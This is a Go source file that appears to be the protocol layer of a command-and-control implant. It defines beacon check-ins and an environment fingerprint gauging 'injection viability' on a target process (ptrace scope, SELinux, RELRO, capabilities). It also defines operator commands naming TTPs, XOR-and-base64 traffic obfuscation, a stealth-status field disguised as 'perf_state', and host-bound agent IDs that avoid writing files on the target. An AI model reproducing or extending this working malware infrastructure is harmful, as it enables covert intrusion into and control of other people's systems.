package protocol

import (
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"strconv"
	"time"
)

const XORKey = 0x5A

// EnvReport is collected by the agent at startup and sent on every check-in.
// Gives the operator visibility into injection viability before issuing TTPs.
type EnvReport struct {
	PtraceScope      int    `json:"ptrace_scope"`
	SELinuxMode      string `json:"selinux_mode"`   // "disabled"/"permissive"/"enforcing"
	TargetPID        int    `json:"target_pid"`
	TargetComm       string `json:"target_comm"`
	TargetRELRO      string `json:"target_relro"`   // "none"/"partial"/"full"/"unknown"
	TargetCapNetRaw  bool   `json:"target_cap_net_raw"`
	TargetNoNewPrivs bool   `json:"target_no_new_privs"`
	KernelVersion    string `json:"kernel_ver"`
	Distro           string `json:"distro"`
}

// CheckIn is sent from agent to server on each beacon.
type CheckIn struct {
	AgentID       string     `json:"agent_id"`
	Hostname      string     `json:"hostname"`
	OS            string     `json:"os"`
	Arch          string     `json:"arch"`
	UID           int        `json:"uid"`
	LastTTP       int        `json:"last_ttp,omitempty"`
	LastResult    string     `json:"last_result,omitempty"`
	LastError     string     `json:"last_error,omitempty"`
	Token         string     `json:"tok"`                    // HMAC-SHA256(secret, agent_id+epoch_hour)
	Env           *EnvReport `json:"env,omitempty"`          // R-01: pre-flight env fingerprint
	StealthStatus string     `json:"perf_state,omitempty"` // local sysfs status; survives server restart
}

// GenerateToken produces HMAC-SHA256(secret, agentID+epochHour).
// epochHour = current Unix time / 3600 — creates a 1-hour sliding window.
// Server accepts current hour and previous hour to handle clock skew.
func GenerateToken(secret, agentID string) string {
	if secret == "" {
		return ""
	}
	epoch := strconv.FormatInt(time.Now().Unix()/3600, 10)
	mac := hmac.New(sha256.New, []byte(secret))
	mac.Write([]byte(agentID + epoch))
	return fmt.Sprintf("%x", mac.Sum(nil))
}

// ValidateToken verifies a token against current and previous epoch hour.
func ValidateToken(secret, agentID, token string) bool {
	if secret == "" {
		return true // auth disabled (no secret compiled in)
	}
	now := time.Now().Unix() / 3600
	for _, epoch := range []int64{now, now - 1} {
		mac := hmac.New(sha256.New, []byte(secret))
		mac.Write([]byte(agentID + strconv.FormatInt(epoch, 10)))
		expected := fmt.Sprintf("%x", mac.Sum(nil))
		if hmac.Equal([]byte(expected), []byte(token)) {
			return true
		}
	}
	return false
}

// Command is sent from server to agent as response.
type Command struct {
	TTP    int    `json:"ttp"`    // 0 = no-op
	Params string `json:"params"` // free-form JSON per TTP
}

// Encode marshals v to JSON, XORs with key, base64-encodes.
func Encode(v any) ([]byte, error) {
	data, err := json.Marshal(v)
	if err != nil {
		return nil, fmt.Errorf("marshal: %w", err)
	}
	xored := xor(data, XORKey)
	dst := make([]byte, base64.StdEncoding.EncodedLen(len(xored)))
	base64.StdEncoding.Encode(dst, xored)
	return dst, nil
}

// Decode base64-decodes, XORs, unmarshals into dst.
func Decode(encoded []byte, dst any) error {
	raw := make([]byte, base64.StdEncoding.DecodedLen(len(encoded)))
	n, err := base64.StdEncoding.Decode(raw, encoded)
	if err != nil {
		return fmt.Errorf("base64 decode: %w", err)
	}
	data := xor(raw[:n], XORKey)
	return json.Unmarshal(data, dst)
}

func xor(data []byte, key byte) []byte {
	out := make([]byte, len(data))
	for i, b := range data {
		out[i] = b ^ key
	}
	return out
}

// GenerateAgentID returns a random hex ID (16 chars).
// Deprecated: use DeriveAgentID for stable, host-bound identity.
func GenerateAgentID() string {
	b := make([]byte, 8)
	_, _ = rand.Read(b)
	return fmt.Sprintf("%x", b)
}

// DeriveAgentID returns a stable 16-char ID bound to secret+hostname.
// Same host always produces the same ID across restarts, preventing reconnect
// spam and making rename/pin persistent without any file write on the target.
func DeriveAgentID(secret, hostname string) string {
	mac := hmac.New(sha256.New, []byte(secret))
	mac.Write([]byte("agentid:" + hostname))
	return fmt.Sprintf("%x", mac.Sum(nil)[:8])
}
